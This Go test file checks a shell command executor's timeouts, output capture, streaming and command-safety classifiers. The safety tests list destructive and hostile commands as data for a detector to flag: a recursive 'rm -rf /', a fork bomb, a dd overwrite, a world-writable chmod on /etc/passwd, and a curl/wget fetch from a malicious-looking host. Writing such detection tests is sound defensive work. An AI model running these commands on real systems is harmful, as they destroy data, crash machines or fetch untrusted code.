package executor

import (
	"context"
	"runtime"
	"strings"
	"testing"
	"time"
)

func TestNew(t *testing.T) {
	executor := New()
	
	if executor.timeout != 30*time.Second {
		t.Errorf("Expected default timeout of 30s, got %v", executor.timeout)
	}
	
	if executor.workDir == "" {
		t.Error("Expected workDir to be set")
	}
	
	if executor.shell == "" {
		t.Error("Expected shell to be detected")
	}
}

func TestWithTimeout(t *testing.T) {
	executor := New().WithTimeout(10 * time.Second)
	
	if executor.timeout != 10*time.Second {
		t.Errorf("Expected timeout of 10s, got %v", executor.timeout)
	}
}

func TestWithWorkDir(t *testing.T) {
	testDir := "/tmp"
	executor := New().WithWorkDir(testDir)
	
	if executor.workDir != testDir {
		t.Errorf("Expected workDir %s, got %s", testDir, executor.workDir)
	}
}

func TestWithShell(t *testing.T) {
	testShell := "/bin/bash"
	executor := New().WithShell(testShell)
	
	if executor.shell != testShell {
		t.Errorf("Expected shell %s, got %s", testShell, executor.shell)
	}
}

func TestExecute_SimpleCommand(t *testing.T) {
	executor := New()
	ctx := context.Background()
	
	var command string
	switch runtime.GOOS {
	case "windows":
		command = "echo hello"
	default:
		command = "echo hello"
	}
	
	result, err := executor.Execute(ctx, command)
	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}
	
	if result.ExitCode != 0 {
		t.Errorf("Expected exit code 0, got %d", result.ExitCode)
	}
	
	if !strings.Contains(result.Stdout, "hello") {
		t.Errorf("Expected stdout to contain 'hello', got: %s", result.Stdout)
	}
	
	if result.Command != command {
		t.Errorf("Expected command %s, got %s", command, result.Command)
	}
	
	if result.Duration <= 0 {
		t.Errorf("Expected positive duration, got %v", result.Duration)
	}
}

func TestExecute_CommandWithError(t *testing.T) {
	executor := New()
	ctx := context.Background()
	
	// Use a command that should fail on all platforms
	command := "nonexistent_command_12345"
	
	result, err := executor.Execute(ctx, command)
	if err == nil {
		t.Error("Expected error for non-existent command")
	}
	
	if result.ExitCode == 0 {
		t.Errorf("Expected non-zero exit code, got %d", result.ExitCode)
	}
}

func TestExecute_Timeout(t *testing.T) {
	executor := New().WithTimeout(100 * time.Millisecond)
	ctx := context.Background()
	
	var command string
	switch runtime.GOOS {
	case "windows":
		command = "ping -n 10 127.0.0.1" // 10 seconds on Windows
	default:
		command = "sleep 10" // 10 seconds on Unix
	}
	
	start := time.Now()
	result, err := executor.Execute(ctx, command)
	duration := time.Since(start)
	
	// Should timeout and return an error
	if err == nil {
		t.Error("Expected timeout error")
	}
	
	// Should timeout within reasonable time (not wait for full command)
	if duration > 5*time.Second {
		t.Errorf("Expected timeout within 5s, took %v", duration)
	}
	
	if result == nil {
		t.Error("Expected result even on timeout")
	}
}

func TestDetectShell(t *testing.T) {
	shell := detectShell()
	
	if shell == "" {
		t.Error("Expected shell to be detected")
	}
	
	switch runtime.GOOS {
	case "windows":
		if !strings.Contains(strings.ToLower(shell), "cmd") && 
		   !strings.Contains(strings.ToLower(shell), "powershell") &&
		   !strings.Contains(strings.ToLower(shell), "pwsh") {
			t.Errorf("Expected Windows shell (cmd/powershell), got %s", shell)
		}
	default:
		if !strings.Contains(shell, "sh") {
			t.Errorf("Expected Unix shell, got %s", shell)
		}
	}
}

func TestIsCommandSafe(t *testing.T) {
	tests := []struct {
		command  string
		expected bool
	}{
		{"ls", true},
		{"ls -la", true},
		{"pwd", true},
		{"cat file.txt", true},
		{"echo hello", true},
		{"date", true},
		{"whoami", true},
		{"rm file.txt", false},
		{"sudo rm -rf /", false},
		{"chmod 777 file", false},
		{"dd if=/dev/zero of=file", false},
		{"unknown_command", false},
	}
	
	for _, test := range tests {
		result := IsCommandSafe(test.command)
		if result != test.expected {
			t.Errorf("IsCommandSafe(%q) = %v, expected %v", test.command, result, test.expected)
		}
	}
}

func TestIsDangerousCommand(t *testing.T) {
	tests := []struct {
		command  string
		expected bool
	}{
		{"rm -rf /", true},
		{"rm -rf *", true},
		{":(){ :|:& };:", true},
		{"dd if=/dev/zero", true},
		{"curl http://malicious.com/script.sh", true},
		{"wget http://example.com/virus", true},
		{"chmod 777 /etc/passwd", true},
		{"sudo shutdown -h now", true},
		{"ls -la", false},
		{"pwd", false},
		{"echo hello", false},
		{"cat file.txt", false},
		{"head -n 10 file.txt", false},
	}
	
	for _, test := range tests {
		result := IsDangerousCommand(test.command)
		if result != test.expected {
			t.Errorf("IsDangerousCommand(%q) = %v, expected %v", test.command, result, test.expected)
		}
	}
}

func TestExecute_WorkingDirectory(t *testing.T) {
	executor := New()
	ctx := context.Background()
	
	// Test that working directory affects command execution
	var command string
	switch runtime.GOOS {
	case "windows":
		command = "cd"
	default:
		command = "pwd"
	}
	
	result, err := executor.Execute(ctx, command)
	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}
	
	if result.ExitCode != 0 {
		t.Errorf("Expected exit code 0, got %d", result.ExitCode)
	}
	
	// Output should contain some directory path
	if len(strings.TrimSpace(result.Stdout)) == 0 {
		t.Error("Expected non-empty stdout for directory command")
	}
}

func TestExecute_Environment(t *testing.T) {
	executor := New()
	ctx := context.Background()
	
	var command string
	switch runtime.GOOS {
	case "windows":
		command = "echo %PATH%"
	default:
		command = "echo $PATH"
	}
	
	result, err := executor.Execute(ctx, command)
	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}
	
	if result.ExitCode != 0 {
		t.Errorf("Expected exit code 0, got %d", result.ExitCode)
	}
	
	// Should have some PATH content
	if len(strings.TrimSpace(result.Stdout)) == 0 {
		t.Error("Expected non-empty PATH variable")
	}
}

func TestExecute_StderrCapture(t *testing.T) {
	executor := New()
	ctx := context.Background()
	
	var command string
	switch runtime.GOOS {
	case "windows":
		// Command that writes to stderr on Windows
		command = "echo error output 1>&2"
	default:
		// Command that writes to stderr on Unix
		command = "echo 'error output' >&2"
	}
	
	result, err := executor.Execute(ctx, command)
	// Command should succeed but have stderr output
	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}
	
	if result.ExitCode != 0 {
		t.Errorf("Expected exit code 0, got %d", result.ExitCode)
	}
	
	if !strings.Contains(result.Stderr, "error output") {
		t.Errorf("Expected stderr to contain 'error output', got: %s", result.Stderr)
	}
}

func TestStream_SimpleCommand(t *testing.T) {
	executor := New()
	ctx := context.Background()
	
	var command string
	switch runtime.GOOS {
	case "windows":
		command = "echo line1 && echo line2"
	default:
		command = "echo line1; echo line2"
	}
	
	outputChan, err := executor.Stream(ctx, command)
	if err != nil {
		t.Fatalf("Stream failed: %v", err)
	}
	
	var lines []string
	for output := range outputChan {
		if !output.IsStderr && output.Content != "" {
			lines = append(lines, output.Content)
		}
	}
	
	if len(lines) < 2 {
		t.Errorf("Expected at least 2 output lines, got %d: %v", len(lines), lines)
	}
	
	// Check that we got the expected lines
	found1, found2 := false, false
	for _, line := range lines {
		if strings.Contains(line, "line1") {
			found1 = true
		}
		if strings.Contains(line, "line2") {
			found2 = true
		}
	}
	
	if !found1 {
		t.Error("Expected to find 'line1' in output")
	}
	if !found2 {
		t.Error("Expected to find 'line2' in output")
	}
}

func TestStream_WithTimeout(t *testing.T) {
	executor := New().WithTimeout(200 * time.Millisecond)
	ctx := context.Background()
	
	var command string
	switch runtime.GOOS {
	case "windows":
		command = "ping -n 10 127.0.0.1"
	default:
		command = "sleep 5"
	}
	
	start := time.Now()
	outputChan, err := executor.Stream(ctx, command)
	if err != nil {
		t.Fatalf("Stream failed: %v", err)
	}
	
	// Consume all output
	for range outputChan {
		// Just consume the channel
	}
	
	duration := time.Since(start)
	
	// Should timeout reasonably quickly
	if duration > 2*time.Second {
		t.Errorf("Expected timeout within 2s, took %v", duration)
	}
}

func TestStream_StderrCapture(t *testing.T) {
	executor := New()
	ctx := context.Background()
	
	var command string
	switch runtime.GOOS {
	case "windows":
		command = "echo error message 1>&2"
	default:
		command = "echo 'error message' >&2"
	}
	
	outputChan, err := executor.Stream(ctx, command)
	if err != nil {
		t.Fatalf("Stream failed: %v", err)
	}
	
	var stderrLines []string
	for output := range outputChan {
		if output.IsStderr && output.Content != "" {
			stderrLines = append(stderrLines, output.Content)
		}
	}
	
	foundErrorMessage := false
	for _, line := range stderrLines {
		if strings.Contains(line, "error message") {
			foundErrorMessage = true
			break
		}
	}
	
	if !foundErrorMessage {
		t.Errorf("Expected to find 'error message' in stderr, got lines: %v", stderrLines)
	}
}

func TestStream_Timestamps(t *testing.T) {
	executor := New()
	ctx := context.Background()
	
	command := "echo test"
	outputChan, err := executor.Stream(ctx, command)
	if err != nil {
		t.Fatalf("Stream failed: %v", err)
	}
	
	for output := range outputChan {
		if output.Content != "" {
			// Check that timestamp is recent
			if time.Since(output.Timestamp) > 5*time.Second {
				t.Errorf("Output timestamp %v seems too old", output.Timestamp)
			}
			break // Just check first non-empty output
		}
	}
}